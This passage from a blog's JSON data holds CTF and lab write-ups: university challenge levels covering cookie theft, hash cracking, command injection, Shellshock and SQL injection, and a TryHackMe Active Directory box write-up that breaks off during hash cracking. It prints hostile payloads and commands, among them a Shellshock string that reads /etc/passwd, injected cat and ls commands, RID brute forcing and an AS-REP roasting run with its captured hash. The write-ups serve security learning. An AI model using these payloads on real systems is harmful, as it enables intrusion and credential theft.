level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55413/eereezeighohfeim</code></p>","<p><img src=\\"/cyber/writeup/unictf/image40.png\\" alt=\\"\\"></p>","<p>The first thing we do was to try the <em>admin@admin:admin</em> username and password combination but without success. Then we investigated the source code looking for some information and we found a comment that said <em>“Never show the sessions.txt file”</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image2.png\\" alt=\\"\\"></p>","<p>As usual, we proceede to change the URL trying to open the <em>sessions.txt</em> file.</p>","<p><img src=\\"/cyber/writeup/unictf/image4.png\\" alt=\\"\\"></p>","<p>After having seen the information in this file, we immediately understood what we had to do because we already knew about an attack where if you can steal a user session you can log in as that user.</p>","<p>While this session was saved in the cookie, we proceeded to open the cookie and change the value. To obtain the cookie we had to log in as a Guest user.</p>","<p><img src=\\"/cyber/writeup/unictf/image6.png\\" alt=\\"\\"></p>","<p>Once in the page, we check if we received the cookie.</p>","<p><img src=\\"/cyber/writeup/unictf/image8.png\\" alt=\\"\\"></p>","<p>We notice that the value of this cookie was different from the value found in the <em>sessions.txt</em> file.</p>","<p><img src=\\"/cyber/writeup/unictf/image10.png\\" alt=\\"\\"></p>","<p>So, we proceede to change it, and our new cookie was:</p>","<p><img src=\\"/cyber/writeup/unictf/image12.png\\" alt=\\"\\"></p>","<p>After reloading the page, we end up in the administrator’s page and logged as him, where we could find the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image14.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 10 - Bytestream","title":"<h2 id=LV10> <span style=\\"color:#da1953\\">Lev</span>el 10 - Bytestream</h2>","body":["<p>The link obtained from level 9:</p>","<p><code>http://eth-lab.di.uniroma1.it:55255/leighaghuuzasaex/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image15.png\\" alt=\\"\\"></p>","<p>As usual, we tried the same combination (admin:admin) without any success.</p>","<p>Then we tried many random combinations of usernames and passwords, for instance, we used some teachers’ usernames just in case we could get it correct, but it failed every time.</p>","<p>The last attempt was to analyse the source code of the web page where we found the following script:</p>","<p><img src=\\"/cyber/writeup/unictf/image16.png\\" alt=\\"\\"></p>","<p>Inside the script, there was a variable called <em>password_hashes</em> which contained the correspondent encrypted password for each user.</p>","<p><img src=\\"/cyber/writeup/unictf/image17.png\\" alt=\\"\\"></p>","<p>The first thing that came into our mind was MD5, so we proceeded to decrypt the hash with an online tool <em>haskiller.co.uk</em> (this site does not exit any more). It resulted in a very good website where it was possible to encrypt and decrypt by using various algorithms.</p>","<p>In addition, you could also download their wordlist in case you need to proceed with an offline hash cracking.</p>","<p><img src=\\"/cyber/writeup/unictf/image66.png\\" alt=\\"\\"></p>","<p>Obviously, we took the hash of the user <em>admin</em> and try to log in with the new credential <em>admin:qwertyuiop</em> and we succeeded in proceeding to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image68.png\\" alt=\\"\\"></p>","<p>But it did not end here because after decrypting the hash we notice that the function <em>checkPassword</em> does not decrypt the user input in order to access the admin page.</p>","<p>So, we tried to reverse the function to understand its logic.</p>","<p><img src=\\"/cyber/writeup/unictf/image69.png\\" alt=\\"\\"></p>","<p>The function follows these steps:</p>","<ol>","<li>Retrieve the values from the form and hash the given password.</li>","<li>It checks if the given user as input in the login form was in the dictionary “password_hashes”, if not it gives an error.</li>","<li>If the user exists, it checks the computed hash with the stored hash, if they don’t match it gives an error.</li>","<li>If the hash matches, it generates the link for the next level by hashing again the input hash and taking the initial 8 characters.</li>","</ol>","<p>We followed the script steps in order to solve the level.</p>","<p><img src=\\"/cyber/writeup/unictf/image71.png\\" alt=\\"\\"></p>","<p>In fact, we can access the right page by adding <em>62aa4dcf.html</em> as the script was doing.</p>","<p><img src=\\"/cyber/writeup/unictf/image74.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 11 - Brutus system","title":"<h2 id=LV11> <span style=\\"color:#da1953\\">Lev</span>el 11 - Brutus system</h2>","body":["<p>We started from the following URL:</p>","<p><code>http://eth-lab.di.uniroma1.it:55025/eepugeighovoorou/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image76.png\\" alt=\\"\\"></p>","<p>The first attempt was to use a few commonly used numbers such as <em>0000</em>, <em>12345</em>, <em>1337</em> but without any success.</p>","<p>As usual, we proceede to analyze the source code where we found a script like the previous levels and our attention was caught by a function called <em>checkPassword</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image79.png\\" alt=\\"\\"></p>","<p>As we can see the <code>if</code> statement checks if the number was between 1 and 1000000 excluded, if it was <em>NaN</em> (empty form) and if it hah at least six digits.</p>","<p>So, we supposed that a valid code could have been a number between 1 and 999999. Then the function hashes the code with MD5 with the salt <em>localsalt</em> and checks if the result hashing was equal to <em>4d1ea4c067daa4dec768540bbcfe80b2</em>.</p>","<p>The first idea was to decrypt the hash to retrieve the right value but due to the lack of an online tool we proceeded to hash with salt all the passwords from 1 to 99999 and check which one matched the string: <em>“4d1ea4c067daa4dec768540bbcfe80b2”</em>.</p>","<p>In order to do it we wrote a Python script.</p>","<p><img src=\\"/cyber/writeup/unictf/image81.png\\" alt=\\"\\"></p>","<p>And this was the result produced by the script.</p>","<p><img src=\\"/cyber/writeup/unictf/image83.png\\" alt=\\"\\"></p>","<p>As expected, the code worked fine.</p>","<p><img src=\\"/cyber/writeup/unictf/image85.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 12 - PHP","title":"<h2 id=LV12> <span style=\\"color:#da1953\\">Lev</span>el 12 - PHP</h2>","body":["<p>The URL obtained from level 11:</p>","<p><code>http://eth-lab.di.uniroma1.it:55528/ithochexephizoof</code></p>","<p><img src=\\"/cyber/writeup/unictf/image65.png\\" alt=\\"\\"></p>","<p>In this case, there was no form or text box where to write so we proceede by analyzing the code where, as usual, we found a script and we focused on a portion of the code.</p>","<p><img src=\\"/cyber/writeup/unictf/image44.png\\" alt=\\"\\"></p>","<p>Here, we can see that the script creates a new link concatenating two strings to complete the URL.</p>","<p>These strings were: <em>“cgi-bin/users.php”</em> and <em>“?filter=”</em>, after which a value was concatenated, but we didn&rsquo;t know which kind of value could follow the string.</p>","<p>We decide to copy and paste the strings to the URL to complete it ourselves and append something in order to execute an XSS since it was JavaScript.</p>","<p><img src=\\"/cyber/writeup/unictf/image45.png\\" alt=\\"\\"></p>","<p>We tried several times but for some reason, no one of our attempts worked (in addition, we were not really good in JavaScript!).</p>","<p>Then we noticed what the home page was prompting: <em>daemon</em>, <em>root</em>, and <em>mysql</em>, things that reminded us of Linux users so we tried to execute a simple Linux command instead of a JavaScript one.</p>","<p><img src=\\"/cyber/writeup/unictf/image46.png\\" alt=\\"\\"></p>","<p>Once find the files in the directory we could try to open <em>secretusers.txt</em> with the command <code>cat</code>.</p>","<p>And the file contain the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image48.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 13 - Shellshock","title":"<h2 id=LV13> <span style=\\"color:#da1953\\">Lev</span>el 13 - Bash Envirorment</h2>","body":["<p>The starting point was the URL obtained from the previous level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55277/neifeesuopheeghu/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image50.png\\" alt=\\"\\"></p>","<p>The first thing we did was to write something in the text box to see what happens and we tried many different kinds of values to check how well it validated the input.</p>","<p><img src=\\"/cyber/writeup/unictf/image52.png\\" alt=\\"\\"></p>","<p>As usuals we proceede to analyze the code in search of information or scripts to reverse. In fact, we fpund a script, and in particular we focused our attention on the function “getenv”.</p>","<p>In addition, we saw the sanitize function on the user input which removes the illegal character from the input: that was the reason why it did not generate any kind of error.</p>","<p><img src=\\"/cyber/writeup/unictf/image54.png\\" alt=\\"\\"></p>","<p>Also, here we could see the making of the URL like the previous levels so we attempted the same method as in the level 12 without any success.</p>","<p><img src=\\"/cyber/writeup/unictf/image56.png\\" alt=\\"\\"></p>","<p>The response was <i>“no variable found”</i> and also when we put an input it prints a <i>“TESTENV”</i> which recalls something similar to the bash environment variable so we decided to do some research to see if there were any vulnerabilities with the bash in the past or something similar.</p>","<p><img src=\\"/cyber/writeup/unictf/image58.png\\" alt=\\"\\"></p>","<p>The first thing we found was something called “Shellshock”. The document explained what and how to exploit this vulnerability providing the string to use in order to execute remote shell commands.</p>","<p>The string was: <code>() { :;}; echo “NS:” $(&lt;/etc/passwd)</code>.</p>","<p>Digging more into the topic we found a <a href=\\"https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf\\">PDF</a> where the shellshock vulnerability was explained alongside its syntax.</p>","<p><img src=\\"/cyber/writeup/unictf/image41.png\\" alt=\\"\\"></p>","<p>So again, we tried to remake the right link appending <em>cgi-bin/env.php?filter=</em> and tried to copy and paste the string suggested but for some reason, no one of the strings were working.</p>","<p><img src=\\"/cyber/writeup/unictf/image42.png\\" alt=\\"\\"></p>","<p>During the laboratory lessons, we were suggested by the teacher to use <strong>Burp</strong> so we tried again with it.</p>","<p>The first thing we did was to copy and paste the payload found on the internet on the link like we did with the browser but without any success.</p>","<p><img src=\\"/cyber/writeup/unictf/image22.jpg\\" alt=\\"\\"></p>","<p>After a few research and random tries, we figured out that we have to encode a few characters and substitute the spaces with <em>+</em>.</p>","<p>So we encoded the “:” and “;” with “%3a” and “%3b” following the guide in this link, and our resulting payload was <code>()+{+%3a%3b}+/bin/ls</code> but still did not work for some reason.</p>","<p><img src=\\"/cyber/writeup/unictf/image23.jpg\\" alt=\\"\\"></p>","<p>Then we remembered, after a lot of struggle, a file called <em>“user.php”</em> on level 12 which has a particular comment.</p>","<p><img src=\\"/cyber/writeup/unictf/image25.jpg\\" alt=\\"\\"></p>","<p>The referrer was disabled for that level and maybe it was enabled in this one, so we tried to add the referrer in our level URL.</p>","<p><img src=\\"/cyber/writeup/unictf/image27.jpg\\" alt=\\"\\"></p>","<p>Which works perfectly, and we succeeded in listing the directory content.</p>","<p>The next step was to read the <em>secret4uou0.txt</em> with the command <code>cat</code> and we sent the payload with a different command <code>/bin/cat+secret4uou0.txt</code> where we found the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image30.jpg\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 14 - SQL Injection","title":"<h2 id=LV14> <span style=\\"color:#da1953\\">Lev</span>el 14 - SQL Injection</h2>","body":["<p>The starting point was the URL obtained from the previous level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55424/aetiasaeghongohx</code></p>","<p>At the beginning of this level, we had no idea what to do, we try to register a user, we try to log in as <em>admin:admin</em> but nothing, then we remembered our Lab class on XSS attack and we try to do it but without success.</p>","<p>Only after few days later we had a class on SQL Injection then we tried to do so.</p>","<p>First of all, we had to find where the vulnerability was, it could be in a form, since it was very common to find them, or we could perform an injection from the URL.</p>","<p>We checked all the forms by writing inside the “ ’ ” character to see if we would get any query error, and we found it on the page “new user” on the field “username”.</p>","<p><img src=\\"/cyber/writeup/unictf/image32.png\\" alt=\\"\\"></p>","<p>Since the class material was not published yet we used a friend presentation about the JSQL Injection from <a href=\\"https://github.com/edoardoPredieri/SQLinjection_Training/blob/master/SQL_Injection.pptx\\">GitHub</a>.</p>","<p>So, our first attempt was to find the number of columns, by doing the queries until we reached the 6th.</p>","<p><img src=\\"/cyber/writeup/unictf/image34.jpg\\" alt=\\"\\"></p>","<p>And saw where were the leaks:</p>","<p><img src=\\"/cyber/writeup/unictf/image36.jpg\\" alt=\\"\\"></p>","<p>Once found that leaks were on row 1, 3 and 4, we tried to find the schema names with the following query.</p>","<p><img src=\\"/cyber/writeup/unictf/image19.jpg\\" alt=\\"\\"></p>","<p>The schema found did not help us.</p>","<p><img src=\\"/cyber/writeup/unictf/image20.jpg\\" alt=\\"\\"></p>","This was really helpful when there were many databases but this was not the case, so we proceeded on finding the tables.","<p><img src=\\"/cyber/writeup/unictf/image21.jpg\\" alt=\\"\\"></p>","<p>The result shows a lot of names of tables but we were looking for something particular where it was possible to find users information.</p>","<p><img src=\\"/cyber/writeup/unictf/image1.jpg\\" alt=\\"\\"></p>","<p>The “users” table seemed to perfectly fit our case, so subsequently it was possible to retrieve the column names.</p>","<p><img src=\\"/cyber/writeup/unictf/image3.jpg\\" alt=\\"\\"></p>","<p>Due to a bad query without the “WHERE” statement it shows all the columns on the database but luckily, we managed to find the interested columns.</p>","<p><img src=\\"/cyber/writeup/unictf/image5.jpg\\" alt=\\"\\"></p>","<p>At this point we have all the necessary information to try to retrieve the credentials of the users.</p>","<p><img src=\\"/cyber/writeup/unictf/image7.jpg\\" alt=\\"\\"></p>","<p>Also, this query gives us as result few credentials (username and password) but we had to choose only two of them.</p>","<p><img src=\\"/cyber/writeup/unictf/image9.jpg\\" alt=\\"\\"></p>","After reading their blogs we found the link of the next level on Tsutomu’s blog.","<p><img src=\\"/cyber/writeup/unictf/image11.jpg\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image13.png\\" alt=\\"\\"></p>"]}]}]}')},9936:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Vulnet: Roasted","path":"vulnet-roasted","tags":["easy","box","thm","windows","dc","kerberoasting","evil-winrm","hashcat","smb","smbclient","active directory","ejpt","kerberos attack","oscp","privesc"],"date":"OCT 2025","location":"./writeup/","banner":"writeup/vulnet-roasted/banner.gif","type":"writeup","search":[{"section":"","description":"Scanning with Nmap, discovering ports 135 msrpc, 139 netbios-ssn, 445 microsoft-ds and 1433 ms-sql-s"}],"body":[{"id":"Vulnet: Roasted","title":"<h1> <span style=\\"color:#da1953\\">Vuln</span>et: Roasted</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/vulnet-roasted/banner.gif\\" alt=\\"\\">","<p>To complete this box, I had to rely on write-ups. If you are here for the same reason, remember that it is totally fine to rely on write-ups as long as you learn something new. This was also one of my first Windows Domain Controller box.</p>"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<p><pre>$ nmap -sC -sV -oN nmap-scan 10.10.79.27     <br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 13:32 EDT<br>Nmap scan report for vulnnet-rst.local (10.10.79.27)<br>Host is up (0.054s latency).<br>Not shown: 990 filtered tcp ports (no-response)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-27 17:35:32Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   date: 2025-10-27T17:35:38<br>|_  start_date: N/A<br>|_clock-skew: -1s<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 199.22 seconds</pre></p>","<p>I have 10 open ports: 53/tcp DNS, 88/tcp kerberos-sec, 135/tcp msrpc, 139/tcp netbios-ssn, 389/tcp ldap, 445/tcp microsoft-ds?, 464/tcp kpasswd5?, 593/tcp ncacn_http, 3268/tcp ldap, 5985/tcp http</p>",{"id":"Setup /etc/hosts","title":"<h2>Setup /etc/hosts</h2>","body":["<p>The Nmap scan revealed the domain for this machine (vulnnet-rst.local), and I updated the host file with it.</p>","<p><pre>$ cat /etc/hosts                                                  <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>10.10.79.27     vulnnet-rst.local<br><br># The following lines are desirable for IPv6 capable hosts<br>::1     localhost ip6-localhost ip6-loopback<br>ff02::1 ip6-allnodes<br>ff02::2 ip6-allrouters</pre></p>","<p>This is often done because because many HTB/THM (and other CTF) targets host multiple services or virtual hosts on the same IP and those services expect a particular hostname (Host header / SNI / Kerberos SPN). Adding an entry to /etc/hosts (or the OS hosts file) makes your machine resolve that hostname to the target IP so requests look authentic to the server.</p>"]}]},{"id":"Enumeration","title":"<h1><span style=\\"color:#da1953\\">Enu</span>meration</h1>","body":[{"id":"SMB Anonymous Login","title":"<h2>SMB Anonymous Login</h2>","body":["<p>The first thing I did was to enumerate SMB with anonymous login, which is a common step in AD enumeration. When prompted to enter the password, just press enter without a password.</p>","<p><pre>$ netexec smb 10.10.79.27 -u \'anythingyouwant\' -p \'\' --shares<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\\\\anythingyouwant: (Guest)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Enumerated shares<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  Share           Permissions     Remark&lt;br&gt;SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  -----           -----------     ------<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  C$                              Default share<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  NETLOGON                        Logon server share <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  SYSVOL                          Logon server share <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing<br></pre></p>","<p>By accessing the shares where I have read permission, I found many notes, including some names and surnames, and I assumed they are users of the systems. Maybe not all of them, but a few may be users of the systems.</p>","<p><pre>$ smbclient \'\\\\\\\\10.10.79.27\\\\VulnNet-Business-Anonymous\'   <br>Password for [WORKGROUP\\\\kali]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>  .                                   D        0  Fri Mar 12 21:46:40 2021<br>  ..                                  D        0  Fri Mar 12 21:46:40 2021<br>  Business-Manager.txt                A      758  Thu Mar 11 20:24:34 2021<br>  Business-Sections.txt               A      654  Thu Mar 11 20:24:34 2021<br>  Business-Tracking.txt               A      471  Thu Mar 11 20:24:34 2021<br><br>                8771839 blocks of size 4096. 4524479 blocks available</pre></p>","<p><pre>$ smbclient \'\\\\10.10.79.27\\\\VulnNet-Enterprise-Anonymous\'<br>Password for [WORKGROUP\\\\kali]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>  .                                   D        0  Fri Mar 12 21:46:40 2021<br>  ..                                  D        0  Fri Mar 12 21:46:40 2021<br>  Enterprise-Operations.txt           A      467  Thu Mar 11 20:24:34 2021<br>  Enterprise-Safety.txt               A      503  Thu Mar 11 20:24:34 2021<br>  Enterprise-Sync.txt                 A      496  Thu Mar 11 20:24:34 2021<br><br>                8771839 blocks of size 4096. 4522959 blocks available<br></pre></p>","<p><pre>$ smbclient \'\\\\10.10.79.27\\\\IPC$\'<br>Password for [WORKGROUP\\\\kali]:<br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>NT_STATUS_NO_SUCH_FILE listing \\\\*</pre></p>","<p>The problem with the usernames I obtained is that I do not know how they are registered in the system. They could be in one of these formats:<i><ul><li>namesurname</li><li>surnamename</li><li>name.surname</li><li>surname.name</li></ul></i>etc.</p>","<p>I have manually crafted a list of possible formats and tried to enumate the SMB shares, but my list of usernames did not work. So I have to find another way to enumerate the users.</p>"]},{"id":"RID Bruteforce","title":"<h2>RID Bruteforce</h2>","body":["<p>Another way to enumerate users is the RID Bruceforcing. But before doing it, let\'s see what it is and why it works.</p>",{"id":"What RID Bruteforce?","title":"<h3>What is a RID (and a SID)?</h3>","body":["<p>A SID (Security Identifier) is Windows’ unique identifier for accounts (users, groups, computers). It looks like <pre>S-1-5-21- &lt; DOMAIN-IDENTIFIERS &gt; - &lt; RID &gt;</pre></p>","<p>The RID (Relative Identifier) is the final numeric part of the SID (the last dash number). It distinguishes an account inside a domain or local machine. Example: <i>S-1-5-21-1111111111-2222222222-3333333333-500</i> and 500 is the RID (historically the local Administrator account).</p>","<p>If you can connect with an anonymous SMB session, the domain/machine SID (the S-1-5-21-... prefix) often appears in metadata the server exposes — most commonly inside security descriptors (ACLs/SDDL) on shares or files, in permission strings, or embedded in readable system files (registry hives, config files) stored on accessible shares. Inspecting ACLs / security descriptors and any readable system/config files is the most reliable, non-intrusive way to obtain the SID prefix.</p>","<p>Often, the guest SMB account has the following SID (not always), which can be used as a starting SID to brute-force the RID and enumerate accounts. <pre>S-1-5-21-1111111111-222222222-333333333-501</pre></p>","<p>501 is the well-known RID for the built-in Guest account on Windows</p>","<p></p>"]},{"id":"How the attack workds?","title":"<h3>How the attack works?</h3>","body":["There are standard Windows APIs and directory/protocol behaviors that map SIDs to human-readable names or return information about whether an account exists:<ul><li>Directory services (LDAP / Active Directory) can be queried for <code>objectSid</code> attributes.</li><li>Local/remote APIs (for example, name-translation APIs exposed by the OS) can ask “who is this SID?” and the server will return either the mapped name or an error/“not found”.</li><li>Some protocol responses include security descriptors (SDDL) or ACEs that contain SIDs; parsing those reveals which SIDs are present.</li></ul>","<p>Possible server responses (conceptual):<ul><li>Exists → returns name/metadata. The server maps the SID and returns the account name and possibly other attributes.</li><li>Doesn\'t exist → “no mapping”/not found. No account corresponds to that RID under that prefix.</li><li>Permission denied / blocked / no reply. The server refuses to disclose or requires auth good from a defensive view.</li></ul></p>"]},"<p>Now that the mystery behind RID bruteforcing has been solved, I will proceed with the RID bruteforcing.</p>","<p><pre>$ nxc smb 10.10.79.27 -u \'anonymous\' -p \'\' --rid-brute<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)                                                                                                                                                         <br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\\\\anonymous: (Guest)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  498: VULNNET-RST\\\\Enterprise Read-only Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  500: VULNNET-RST\\\\Administrator (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  501: VULNNET-RST\\\\Guest (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  502: VULNNET-RST\\\\krbtgt (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  512: VULNNET-RST\\\\Domain Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  513: VULNNET-RST\\\\Domain Users (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  514: VULNNET-RST\\\\Domain Guests (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  515: VULNNET-RST\\\\Domain Computers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  516: VULNNET-RST\\\\Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  517: VULNNET-RST\\\\Cert Publishers (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  518: VULNNET-RST\\\\Schema Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  519: VULNNET-RST\\\\Enterprise Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  520: VULNNET-RST\\\\Group Policy Creator Owners (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  521: VULNNET-RST\\\\Read-only Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  522: VULNNET-RST\\\\Cloneable Domain Controllers (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  525: VULNNET-RST\\\\Protected Users (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  526: VULNNET-RST\\\\Key Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  527: VULNNET-RST\\\\Enterprise Key Admins (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  553: VULNNET-RST\\\\RAS and IAS Servers (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  571: VULNNET-RST\\\\Allowed RODC Password Replication Group (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  572: VULNNET-RST\\\\Denied RODC Password Replication Group (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\\\\WIN-2BO8M1OE1M1$ (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\\\\DnsAdmins (SidTypeAlias)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\\\\DnsUpdateProxy (SidTypeGroup)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\\\\enterprise-core-vn (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\\\\a-whitehat (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\\\\t-skid (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\\\\j-goldenhand (SidTypeUser)<br>SMB         10.10.79.27     445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\\\\j-leet (SidTypeUser)<br></pre></p>","<p>The tool extracted the following users:<ul><li>a-whitehat</li><li>j-goldenhand</li><li>t-skid</li><li>j-leet</li></ul><br>I also saved them in a file to use as a wordlist later.</p>"]}]},{"id":"Kerberoasting","title":"<h1><span style=\\"color:#da1953\\">Ker</span>beroasting</h1>","body":["Among the various attacks, Kerberoasting seemed the most plausible to me, also the name of the challene sugests it. I had to rely on writeups as I didnt know what tool to use and how to implement the attack atought I knew the logic behind the attack and how the Kerberos authentication protocol works.","<p>GetUserSPNs (tool to implement Kerberoasting) automates two things: (1) finding accounts in Active Directory that are associated with service principal names (SPNs), and (2) asking the Kerberos service for service tickets for those SPNs. The returned service ticket is encrypted with a key derived from the service account’s password. That encrypted ticket can be extracted and attacked offline to recover the service account password (or its equivalent key material). This general technique is called Kerberoasting (and is conceptually similar to AS-REP roasting for accounts without Kerberos pre-authentication).</p>","<p><pre>$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile ./users<br>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies <br><br>[-] User a-whitehat doesn\'t have UF_DONT_REQUIRE_PREAUTH set<br>[-] User j-goldenhand doesn\'t have UF_DONT_REQUIRE_PREAUTH set<br>$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:8ac208a2af70d6a2bac58fa5cc64103c$89c4fbc54e61730ea6f6769e9dbf8171b980423f815196d77d879a91400ef773d<br>904894d3b9611e42c47e6ab7a5a087628248c14696c1d9431f32d7f75ca54e6be714934653583e1baee45089451f7b2bb95ccfd01e83cddb1d2b6149229b6e2d414116b1a<br>132bcb621399a4894745cbb0f2a59102da0b6d7152c3cf6345d270aef22dd7a8687d2a241db586a33330b58808857db25b14c4edbff2d6397905e63f9585534499779ea54<br>52c790ee9aff1598ea5d41f6360493ad8e801aab5ccb3eca4bbddae15d3a079d5cc949ab4b67bb968bb2cd7a4f892cd5b4d36268dc0f6cec6fba8eafb0f02db93000d1864<br>135c9a4ee7df501f<br>[-] User j-leet doesn\'t have UF_DONT_REQUIRE_PREAUTH set</pre></p>","<p>The attack successfully completed and found <i>t-skid</i> hash. I can crack it with JTR or Hashcat.</p>"]},{"id":"Hash Cracking","title":"<h1><span style=\\"color:#da1953\\">Has</span>h Cracking</h1>","body":["<p>The next step will be saving the hash in a file and cracking it with hashcat.</p>","<p><img src=\\"/cyber/writeup/vulnet-roasted/hash.JPG\\" alt=\\"\\"></p>","<p><pre>$ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt.gz <br>hashcat (v6.2.6) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]<br>====================================================================================================================================================<br>* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 1424/2912 MB (512 MB allocatable), 4MCU<br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 